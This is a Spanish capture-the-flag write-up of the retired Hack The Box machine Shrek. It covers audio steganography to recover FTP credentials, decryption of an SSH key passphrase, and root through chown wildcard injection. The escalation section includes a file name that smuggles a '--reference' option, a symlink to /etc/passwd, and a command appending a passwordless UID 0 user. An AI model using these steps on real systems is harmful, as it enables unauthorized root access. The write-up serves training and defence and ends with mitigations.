---
machine: Shrek
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, steganography, ftp, ssh-key, wildcard, chown, privesc]
---

# Shrek — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

`/uploads` no funciona como gestor, pero expone archivos sospechosos; uno contiene un comentario que apunta a `/secret_area_51`. En ese directorio hay un MP3 con datos ocultos: el espectrograma y los chunks al final del archivo esconden las credenciales del FTP. En FTP hay una clave SSH cifrada y 31 archivos `.txt` con datos en base64; dos de ellos contienen una passphrase y un blob cifrado que, al descifrarse, revelan la contraseña de la clave. Con SSH como `sec` se descubre un cron que ejecuta `chown nobody:nobody *` en un directorio escribible; un symlink a `/etc/passwd` hace que el comodín cambie su propietario, y al poder editarlo se añade un usuario root.

## Reconocimiento

```bash
nmap -Pn -sCV -p21,22,80 <IP>
```

- `21` vsftpd 3.0.3.
- `22` OpenSSH 7.5.
- `80` Apache httpd 2.4.27 (Unix).

```bash
feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Aparecen `/uploads` y `/secret_area_51`.

## Enumeración

`/uploads` devuelve un listado con archivos de malware o muestras. Uno de los scripts incluye un comentario sobre un «directorio secreto»: `/secret_area_51`. Allí solo hay una copia de un MP3.

El archivo se analiza con Audacity (vista de espectrograma) y con `binwalk`/`strings`. Al final de la canción hay datos que no pertenecen al audio; en el espectrograma se lee un mensaje y en el chunk final aparecen las credenciales del FTP:

```bash
binwalk allstar.mp3
strings -n 6 allstar.mp3 | tail -20
```

## Foothold

Con las credenciales del FTP se listan 31 archivos `.txt` y una clave `key`:

```bash
ftp <IP>
ls
mget *.txt
get key
```

Los `.txt` contienen cadenas en base64. Dos archivos incluyen una passphrase y un blob cifrado; al decodificarlos y descifrar el blob se obtiene la contraseña de la clave SSH:

```bash
base64 -d archivo1.txt > pass.txt
base64 -d archivo2.txt > blob.enc
openssl enc -d -aes-256-cbc -in blob.enc -pass file:pass.txt
```

La clave `key` está cifrada; con la passphrase recuperada se usa para entrar como `sec`:

```bash
chmod 600 key
ssh -i key sec@<IP>
```

## Movimiento lateral

No hay otro host. `sec` tiene un home con pocos archivos y un directorio de trabajo desde el que se ejecuta la tarea periódica. La enumeración se centra en `pspy`, en los permisos y en los cambios de propietario.

## Escalada de privilegios

`pspy` muestra un cron que ejecuta `chown nobody:nobody *` sobre un directorio escribible:

```text
CMD: UID=0 ... | /bin/chown nobody:nobody *
```

El comodín se expande con los nombres del directorio, y `chown` acepta opciones que lleguen en esos nombres. Se crea un archivo propiedad de `sec` que sirva de referencia, un archivo llamado `--reference=<ese archivo>` y un symlink `passwd` hacia `/etc/passwd`:

```bash
cd /usr/src
touch user.txt                 # propiedad de sec
touch -- --reference=user.txt
ln -s /etc/passwd passwd
```

El cron ejecuta `chown nobody:nobody --reference=user.txt passwd`: toma el propietario de `user.txt` (`sec`) y lo aplica a `/etc/passwd`, siguiendo el symlink. Con el archivo bajo su control, `sec` añade un usuario UID 0 y hace `su`:

```bash
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

En *Beyond Root* se comprueba por qué el archivo de notas del directorio no cambia de propietario y se documenta una ruta alternativa basada en la automatización de la máquina.

## Evidencia

- `/secret_area_51` y el MP3 con datos al final.
- Credenciales del FTP en el chunk y mensaje en el espectrograma.
- Clave SSH cifrada y passphrase recuperada de los `.txt`.
- `pspy` con `chown nobody:nobody *`.
- Symlink a `/etc/passwd`, propietario cambiado y usuario UID 0.

## Lecciones aprendidas

- La esteganografía puede esconder credenciales en audio y en metadatos, no solo en imágenes.
- Un FTP con archivos de «malware» puede ser una cadena de pistas.
- Un comodín en un comando privilegiado procesa nombres controlados por el atacante.
- `chown` sigue symlinks por defecto; hay que usar `-h` y comprobar el tipo de archivo.
- Cambiar el propietario de `/etc/passwd` es equivalente a dar root.

## Mitigaciones y detección

- No publicar directorios con muestras ni archivos internos.
- Revisar los MP3 y documentos antes de subirlos; no confiar en la extensión.
- Evitar comodines en scripts privilegiados; usar `find` con `-maxdepth` y `-type f`.
- Ejecutar `chown` con `-h` y sobre una lista explícita de archivos.
- Monitorizar cambios de propietario en `/etc/passwd`, `/etc/shadow` y `/etc/sudoers`.
- Alertar de symlinks en directorios procesados por cron y de nuevos usuarios UID 0.

## Referencias

- [0xdf — Shrek](https://0xdf.gitlab.io/2020/07/22/htb-shrek.html)
- [IppSec — Shrek](https://www.youtube.com/watch?v=tI592BjTd4o)
- [Hack The Box — Shrek](https://app.hackthebox.com/machines/shrek)
